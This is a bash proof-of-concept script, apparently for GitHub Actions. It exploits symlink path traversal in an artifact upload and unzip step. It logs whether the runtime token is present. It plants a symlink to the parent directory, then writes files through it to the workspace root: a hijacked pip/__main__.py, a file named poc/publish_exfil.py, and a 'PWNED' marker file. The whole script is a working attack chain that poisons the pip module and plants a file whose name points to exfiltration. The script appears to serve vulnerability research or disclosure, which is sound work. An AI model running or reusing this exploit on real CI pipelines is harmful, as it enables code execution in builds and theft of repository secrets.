#!/bin/bash
exec 1>&2
echo "POC_ACTION_START cwd=$(pwd) token_len=${#ACTIONS_RUNTIME_TOKEN} results_url_set=$([ -n "${ACTIONS_RESULTS_URL:-}" ] && echo yes || echo no)"
if [ -f /tmp/poc_action_planted ]; then
  echo "POC_ACTION_SKIP already"
  exit 0
fi
touch /tmp/poc_action_planted
cd "${GITHUB_WORKSPACE:-$(pwd)}" || exit 0
INPUT_NAME='.' INPUT_ENTRIES='[{"name":"p","content":"..","mode":41471}]' python3 poc/upload.py
echo "POC_ACTION_DOT_EXIT=$?"
sleep 2
INPUT_NAME='p' INPUT_ENTRIES='[{"name":"pip/__init__.py","content":"","mode":33188},{"name":"pip/__main__.py","file":"poc/pip_main.py","mode":33188},{"name":"poc_publish.py","file":"poc/publish_exfil.py","mode":33188},{"name":"PWNED_TRAVERSAL.txt","content":"symlink unzip traversal reached the workspace root\n","mode":33188}]' python3 poc/upload.py
echo "POC_ACTION_P_EXIT=$?"
echo "POC_ACTION_DONE"
exit 0
